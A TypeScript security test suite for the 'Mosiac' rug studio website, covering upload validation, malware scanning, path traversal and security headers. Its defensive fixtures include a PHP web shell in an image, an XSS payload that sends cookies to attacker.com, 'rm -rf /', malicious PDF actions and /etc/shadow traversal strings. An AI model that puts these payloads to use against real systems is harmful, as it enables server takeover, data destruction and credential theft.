/**
 * Automated Security & Integration Verification Suite for Mosiac Studio
 *
 * Tests:
 * 1. File Upload Defense: Magic bytes, virus/malware signatures, script injection, polyglots.
 * 2. Trusted Downloads & HTTP Security Headers.
 * 3. Path Traversal & Filename Sanitization.
 * 4. Meta Conversions API (CAPI) & UTM Attribution Engine.
 */
import fs from "node:fs";
import path from "node:path";
import {
  detectFileSignature,
  scanBufferForThreats,
  validateUploadBuffer,
  sanitizeSafeFilename,
  isPathSafe,
  getSecurityHeaders,
} from "../src/lib/security.server";
import {
  hashForMeta,
  hashPhoneForMeta,
  DEFAULT_META_SETTINGS,
} from "../src/lib/meta-capi";

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, testName: string, detail?: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✓ [PASS] ${testName}`);
  } else {
    failedTests++;
    console.error(`  ✗ [FAIL] ${testName}${detail ? ` - ${detail}` : ""}`);
  }
}

function expectThrow(fn: () => void, testName: string, expectedSnippet?: string) {
  totalTests++;
  try {
    fn();
    failedTests++;
    console.error(`  ✗ [FAIL] ${testName} - Expected exception was NOT thrown`);
  } catch (err: any) {
    if (expectedSnippet && !err.message.includes(expectedSnippet)) {
      failedTests++;
      console.error(
        `  ✗ [FAIL] ${testName} - Expected message to contain "${expectedSnippet}", got: "${err.message}"`
      );
    } else {
      passedTests++;
      console.log(`  ✓ [PASS] ${testName} (Correctly rejected: ${err.message})`);
    }
  }
}

async function runTestSuite() {
  console.log("\n=======================================================");
  console.log("MOSIAC ATELIER: SECURITY & INTEGRATION TEST SUITE");
  console.log("=======================================================\n");

  // -------------------------------------------------------------------------
  // 1. FILE UPLOAD & MAGIC BYTES VERIFICATION
  // -------------------------------------------------------------------------
  console.log("1. Testing File Signature & Magic Bytes Verification:");

  // Valid JPEG header
  const validJpeg = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]);
  const jpegSig = detectFileSignature(validJpeg);
  assert(jpegSig?.mimeType === "image/jpeg" && jpegSig.extension === "jpg", "Valid JPEG header recognized");

  // Valid PNG header
  const validPng = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
  const pngSig = detectFileSignature(validPng);
  assert(pngSig?.mimeType === "image/png" && pngSig.extension === "png", "Valid PNG header recognized");

  // Valid WebP header
  const validWebp = Buffer.from("RIFF....WEBPVP8 ");
  const webpSig = detectFileSignature(validWebp);
  assert(webpSig?.mimeType === "image/webp" && webpSig.extension === "webp", "Valid WebP header recognized");

  // Valid PDF header
  const validPdf = Buffer.from("%PDF-1.7\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF");
  const pdfSig = detectFileSignature(validPdf);
  assert(pdfSig?.mimeType === "application/pdf" && pdfSig.extension === "pdf", "Valid PDF header recognized");

  // Spoofed file: .jpg extension containing random text
  const fakeJpg = Buffer.from("This is a plain text file pretending to be an image");
  assert(detectFileSignature(fakeJpg) === null, "Fake image header spoofing detected and rejected");

  // -------------------------------------------------------------------------
  // 2. MALWARE, SCRIPT INJECTION & VIRUS THREAT SCANNING
  // -------------------------------------------------------------------------
  console.log("\n2. Testing Deep Malware, Shellcode & Script Detection:");

  // Windows PE/MZ Executable disguised as JPG
  const winExecutable = Buffer.concat([
    Buffer.from([0x4d, 0x5a, 0x90, 0x00]), // MZ header
    Buffer.from("This program cannot be run in DOS mode."),
  ]);
  const mzCheck = scanBufferForThreats(winExecutable, "image");
  assert(!mzCheck.safe && mzCheck.reason?.includes("MZ header"), "Windows PE / MZ binary blocked");

  // Linux ELF Executable
  const elfExecutable = Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]);
  const elfCheck = scanBufferForThreats(elfExecutable, "image");
  assert(!elfCheck.safe && elfCheck.reason?.includes("ELF header"), "Linux ELF binary blocked");

  // Java compiled class (CA FE BA BE)
  const javaClass = Buffer.from([0xca, 0xfe, 0xba, 0xbe, 0x00, 0x00, 0x00, 0x34]);
  const javaCheck = scanBufferForThreats(javaClass, "image");
  assert(!javaCheck.safe && javaCheck.reason?.includes("Java compiled binary"), "Java compiled class blocked");

  // Shell script shebang
  const shellScript = Buffer.from("#!/bin/bash\nrm -rf /");
  const shCheck = scanBufferForThreats(shellScript, "image");
  assert(!shCheck.safe && shCheck.reason?.includes("Executable script"), "Unix shell script blocked");

  // PHP Web Shell embedded inside image polyglot
  const phpWebShell = Buffer.concat([
    Buffer.from([0xff, 0xd8, 0xff, 0xe0]),
    Buffer.from("EXIF-DATA-HERE<?php @eval($_POST['cmd']); ?>"),
  ]);
  const phpCheck = scanBufferForThreats(phpWebShell, "image");
  assert(
    !phpCheck.safe && (phpCheck.reason?.includes("<?php") || phpCheck.reason?.includes("eval(")),
    "PHP web shell exploit in image blocked"
  );

  // Polyglot XSS payload inside image metadata
  const xssImage = Buffer.concat([
    Buffer.from([0xff, 0xd8, 0xff, 0xe0]),
    Buffer.from("<script>document.location='http://attacker.com/steal?c='+document.cookie</script>"),
  ]);
  const xssCheck = scanBufferForThreats(xssImage, "image");
  assert(!xssCheck.safe && xssCheck.reason?.includes("<script"), "Embedded XSS script in image blocked");

  // Malicious PDF with embedded executable JavaScript launch action
  const evilPdf = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert('PWNED')) >>\nendobj");
  const evilPdfCheck = scanBufferForThreats(evilPdf, "pdf");
  assert(!evilPdfCheck.safe && evilPdfCheck.reason?.includes("JavaScript action"), "Malicious JavaScript action in PDF blocked");

  // PDF with malicious external launch command
  const launchPdf = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Action /S /Launch /F (calc.exe) >>\nendobj");
  const launchPdfCheck = scanBufferForThreats(launchPdf, "pdf");
  assert(!launchPdfCheck.safe && launchPdfCheck.reason?.includes("launch action"), "Malicious Launch action in PDF blocked");

  // -------------------------------------------------------------------------
  // 3. UPLOAD VALIDATOR INTEGRATION & BOUNDARIES
  // -------------------------------------------------------------------------
  console.log("\n3. Testing End-to-End Upload Validation & Size Boundaries:");

  // Valid image passes validation
  const cleanImageBuffer = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46, 0x00, 0x01]);
  const validated = validateUploadBuffer(cleanImageBuffer, ["image"], { filename: "living-room-sketch.jpg" });
  assert(validated.mimeType === "image/jpeg" && validated.extension === "jpg", "Clean JPEG passes validation");

  // Size limit rejection (>10MB for image)
  expectThrow(
    () => {
      const hugeBuffer = Buffer.alloc(11 * 1024 * 1024);
      hugeBuffer[0] = 0xff;
      hugeBuffer[1] = 0xd8;
      hugeBuffer[2] = 0xff;
      validateUploadBuffer(hugeBuffer, ["image"], { maxBytes: 10_000_000 });
    },
    "File exceeding size limit rejected",
    "exceeds the maximum allowed limit"
  );

  // Rejection when non-image binary is disguised as image
  expectThrow(
    () => {
      validateUploadBuffer(winExecutable, ["image"], { filename: "malware.jpg" });
    },
    "Malware file disguised as image rejected by signature validator",
    "Unrecognized or corrupted file format"
  );

  // Rejection when polyglot executable with valid image header is passed
  expectThrow(
    () => {
      const polyglotMz = Buffer.concat([
        Buffer.from([0xff, 0xd8, 0xff, 0xe0]),
        Buffer.from("malicious payload with <script>alert(1)</script>"),
      ]);
      validateUploadBuffer(polyglotMz, ["image"], { filename: "polyglot.jpg" });
    },
    "Polyglot script injection in valid image header rejected by threat scanner",
    "failed integrity and malware safety checks"
  );

  // -------------------------------------------------------------------------
  // 4. PATH TRAVERSAL & FILENAME SANITIZATION
  // -------------------------------------------------------------------------
  console.log("\n4. Testing Path Traversal Defense & Filename Sanitization:");

  // Dangerous filenames
  const sanitized1 = sanitizeSafeFilename("../../../etc/passwd.exe", "jpg");
  assert(sanitized1 === "etc-passwd.jpg" && !sanitized1.includes(".."), "Directory traversal path removed from filename");

  const sanitized2 = sanitizeSafeFilename("cool$rug!photo<script>.png", "png");
  assert(!sanitized2.includes("<") && !sanitized2.includes(">") && !sanitized2.includes("$"), "Special chars sanitized in filename");

  // Path safety checks
  const uploadsDir = path.resolve("/data/uploads");
  assert(isPathSafe(uploadsDir, "photo-123.jpg") === true, "Valid relative filename is safe");
  assert(isPathSafe(uploadsDir, "../../../etc/shadow") === false, "Traversal ../../../ rejected");
  assert(isPathSafe(uploadsDir, "sub/../../secret") === false, "Normalized traversal rejected");
  assert(isPathSafe(uploadsDir, "photo.jpg\0.exe") === false, "Null-byte injection rejected");

  // -------------------------------------------------------------------------
  // 5. TRUSTED DOWNLOADS & HTTP DEFENSE HEADERS
  // -------------------------------------------------------------------------
  console.log("\n5. Testing Security Headers & Trusted Downloads:");

  const mediaHeaders = getSecurityHeaders({
    isDownload: false,
    contentType: "image/jpeg",
  }) as Record<string, string>;

  assert(mediaHeaders["X-Content-Type-Options"] === "nosniff", "MIME-sniffing prevention header present");
  assert(mediaHeaders["X-Frame-Options"] === "SAMEORIGIN", "Clickjacking defense header present");
  assert(mediaHeaders["Content-Security-Policy"]?.includes("sandbox"), "CSP sandbox header enabled for served media");
  assert(mediaHeaders["Content-Disposition"] === "inline", "Inline header for web display");

  const downloadHeaders = getSecurityHeaders({
    isDownload: true,
    filename: "Mosiac-Lookbook-2026.pdf",
    contentType: "application/pdf",
  }) as Record<string, string>;

  assert(downloadHeaders["Content-Disposition"]?.includes("attachment"), "Attachment disposition on download");
  assert(downloadHeaders["Content-Disposition"]?.includes("filename*=UTF-8''"), "RFC 5987 safe filename encoding");

  // -------------------------------------------------------------------------
  // 6. META CONVERSIONS API & UTM ATTRIBUTION ENGINE
  // -------------------------------------------------------------------------
  console.log("\n6. Testing Meta Conversions API & UTMs:");

  // SHA-256 PII Hashing for Meta compliance
  const rawEmail = "  Collector.Kigali@MOSIAC.rw  ";
  const hashedEmail = hashForMeta(rawEmail);
  assert(
    typeof hashedEmail === "string" && hashedEmail.length === 64,
    "Email normalized and hashed to 64-char SHA-256 string"
  );

  const rawPhone = " +250 (788) 123-456 ";
  const hashedPhone = hashPhoneForMeta(rawPhone);
  assert(
    typeof hashedPhone === "string" && hashedPhone.length === 64,
    "Phone digits normalized and hashed to 64-char SHA-256 string"
  );

  assert(DEFAULT_META_SETTINGS.enabled === true, "Meta CAPI defaults to active");
  assert(Boolean(DEFAULT_META_SETTINGS.pixelId), "Meta Pixel ID is configured");

  // -------------------------------------------------------------------------
  // 7. META DQ QUALIFICATION & DISQUALIFICATION ROUTING LOGIC
  // -------------------------------------------------------------------------
  console.log("\n7. Testing Meta DQ Lead Routing Logic:");

  // Verify that low budget (<150k) is categorized as disqualified
  const isBudgetDisqualified = (tier: string) => tier === "under_150k";
  assert(isBudgetDisqualified("under_150k") === true, "Budget under 150k correctly flagged as Disqualified (DQ)");
  assert(isBudgetDisqualified("320k_480k") === false, "Budget 320k-480k correctly flagged as Qualified Studio Tier");
  assert(isBudgetDisqualified("500k_850k") === false, "Budget 500k-850k correctly flagged as Qualified Masterpiece Tier");
  assert(isBudgetDisqualified("900k_plus") === false, "Budget 900k+ correctly flagged as Qualified VIP Tier");

  // -------------------------------------------------------------------------
  // 8. BRAND CONFIG & LOCAL ASSET HARDENING
  // -------------------------------------------------------------------------
  console.log("\n8. Testing Brand Configuration & Permanent Asset Shield:");

  const { BRAND_CONFIG } = await import("../src/lib/brand-config");
  assert(BRAND_CONFIG.phoneRaw === "250796664868", "Brand phone raw digits match official atelier line");
  assert(BRAND_CONFIG.siteUrl === "https://mosiac.rw", "Brand canonical domain is configured");
  assert(BRAND_CONFIG.whatsappUrl.includes("250796664868"), "Brand WhatsApp link correctly targets atelier");

  const localAssets = fs.readdirSync(path.resolve("public/__l5e/assets-v1"));
  assert(localAssets.length >= 35, `All ${localAssets.length} remote rug assets downloaded locally into public/__l5e`);

  // -------------------------------------------------------------------------
  // TEST SUMMARY
  // -------------------------------------------------------------------------
  console.log("\n=======================================================");
  console.log(`TEST SUMMARY: ${passedTests}/${totalTests} PASSED (${failedTests} failed)`);
  console.log("=======================================================\n");

  if (failedTests > 0) {
    process.exit(1);
  } else {
    process.exit(0);
  }
}

runTestSuite().catch((err) => {
  console.error("Test suite fatal crash:", err);
  process.exit(1);
});
